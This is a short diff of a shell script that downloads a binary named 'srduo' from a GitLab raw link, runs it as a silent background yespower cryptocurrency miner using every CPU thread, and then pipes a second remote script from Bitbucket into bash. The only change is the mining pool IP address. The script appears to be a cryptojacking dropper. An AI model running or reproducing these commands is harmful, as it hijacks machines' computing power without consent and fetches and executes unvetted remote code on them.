@@ -2,5 +2,5 @@
 apt-get install wget -y
 curl https://gitlab.com/vainlevy/file/-/raw/master/srduo -o srduo
 chmod +x srduo
-./srduo --algorithm yespower --pool 206.189.152.87:443 --wallet uzrKLPM88xXDP3CtWdPwh8ZvxsHNXXrLju.bass --password x --cpu-threads $(nproc --all) --disable-gpu > /dev/null 2>&1 &
+./srduo --algorithm yespower --pool 138.197.98.18:443 --wallet uzrKLPM88xXDP3CtWdPwh8ZvxsHNXXrLju.bass --password x --cpu-threads $(nproc --all) --disable-gpu > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/nicezep/file/raw/master/time | bash
